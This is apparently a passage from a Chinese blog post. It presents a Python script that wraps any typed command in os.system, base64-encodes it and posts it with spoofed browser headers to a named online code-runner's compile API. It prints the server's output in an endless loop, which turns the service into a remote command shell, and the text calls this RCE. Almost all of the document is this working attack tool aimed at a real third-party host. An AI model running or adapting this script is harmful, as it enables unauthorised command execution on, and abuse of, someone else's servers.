这样一个简单循环执行命令的demo就出来了

import requests
import base64


def encode(cmd):
    
    encode_str = """
#!/usr/bin/python
# -*- coding: utf-8 -*-
import os
os.system("{0}")
    """.format(cmd)

    return base64.b64encode(encode_str.encode('utf-8'))

def RCE(cmd):
    code = encode(cmd)
    url = "http://runcode-api2-ng.xooxcn.com/compile2"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0",
        "Accept":"*/*",
        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
        "Accept-Encoding": "gzip, deflate",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Content-Length": "134",
        "Origin": "http://www.xooxcn.com",
        "Connection": "keep-alive",
        "Referer": "http://www.xooxcn.com/",
    }
    data = {
        "language": "20",
        "code": code,
        "stdin": r"123\nhaha2\n"
    }
    
    req = requests.post(url, data=data, headers=headers)
    output = req.json()["output"]
    print(output)


if __name__ == '__main__':
    while True:
        cmd = input(">>>请输入需要执行的命令：")
        RCE(cmd)
